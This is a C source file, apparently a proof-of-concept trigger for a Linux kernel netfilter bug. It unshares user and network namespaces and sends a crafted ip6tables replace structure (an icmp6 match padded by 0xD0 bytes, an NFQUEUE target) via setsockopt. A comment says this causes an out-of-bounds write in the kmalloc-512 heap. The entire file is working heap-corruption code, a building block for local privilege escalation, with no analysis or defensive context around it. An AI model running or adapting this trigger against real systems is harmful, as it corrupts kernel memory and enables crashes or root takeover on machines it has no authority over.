#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv6/ip6_tables.h>

int main(int argc, char *argv[]) {
  int s;

  if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) != 0) err(1, "unshare(CLONE_NEWNET)");

  if ((s = socket(AF_INET6, SOCK_STREAM, 0)) < 0) err(1, "socket");

  struct {
    struct ip6t_replace replace;
    struct ip6t_entry entry;
    struct xt_entry_match match;
    char pad[0xD0];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, "icmp6");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // Trigger Out-Of-Bounds write in kmalloc-512 (offset 0x200-0x204 overwritten
  // with zeros).
  if (setsockopt(s, SOL_IPV6, IP6T_SO_SET_REPLACE, &data, sizeof(data)) != 0) { 
    if (errno == ENOPROTOOPT)
      err(1, "Error: ip6_tables module is not loaded");
  }

  close(s);

  return 0;
}